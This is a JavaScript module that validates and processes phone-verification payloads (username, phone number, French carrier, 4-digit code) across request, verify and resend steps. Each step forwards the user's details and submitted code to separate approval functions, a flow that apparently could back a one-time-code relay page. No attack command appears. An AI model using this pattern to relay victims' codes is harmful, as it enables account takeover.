const CARRIERS = new Set(["Bouygues", "Orange", "SFR"]);

function cleanString(value, maxLength) {
  if (typeof value !== "string") return "";
  return value.trim().slice(0, maxLength);
}

function baseFields(body) {
  const username = cleanString(body.username, 64);
  const phone = cleanString(body.phone, 32);
  const carrier = cleanString(body.carrier, 32);

  if (!username || !phone || !CARRIERS.has(carrier)) {
    throw new Error("Invalid fields");
  }

  return { username, phone, carrier };
}

export function validatePayload(body) {
  if (!body || typeof body !== "object") {
    throw new Error("Invalid payload");
  }

  const type = body.type;

  if (type === "request") {
    return { type, ...baseFields(body) };
  }

  if (type === "verify") {
    const sessionId = cleanString(body.sessionId, 36);
    const code = cleanString(body.code, 4);

    if (!sessionId || !/^\d{4}$/.test(code)) {
      throw new Error("Invalid verify payload");
    }

    return { type, sessionId, code, ...baseFields(body) };
  }

  if (type === "resend_code") {
    const sessionId = cleanString(body.sessionId, 36);

    if (!sessionId) {
      throw new Error("Invalid resend payload");
    }

    return { type, sessionId, ...baseFields(body) };
  }

  throw new Error("Invalid type");
}

export async function processRequest(payload, { createSession, sendApprovalRequest, getSiteMode }) {
  const sessionId = await createSession(payload);
  await sendApprovalRequest({ sessionId, ...payload });
  const siteMode = await getSiteMode();
  return { ok: true, sessionId, siteMode };
}

export async function processVerify(payload, { submitCode, sendCodeVerificationRequest }) {
  const session = await submitCode(payload.sessionId, payload.code);

  if (!session) {
    throw new Error("Session not ready for code");
  }

  await sendCodeVerificationRequest({
    sessionId: payload.sessionId,
    username: payload.username,
    phone: payload.phone,
    carrier: payload.carrier,
    code: payload.code,
  });

  return { ok: true, sessionId: payload.sessionId };
}

export async function processResend(payload, { requestResendCode, sendResendApprovalRequest }) {
  const session = await requestResendCode(payload.sessionId);

  if (!session) {
    throw new Error("Session not found");
  }

  await sendResendApprovalRequest({
    sessionId: payload.sessionId,
    username: payload.username,
    phone: payload.phone,
    carrier: payload.carrier,
  });

  return { ok: true, sessionId: payload.sessionId };
}
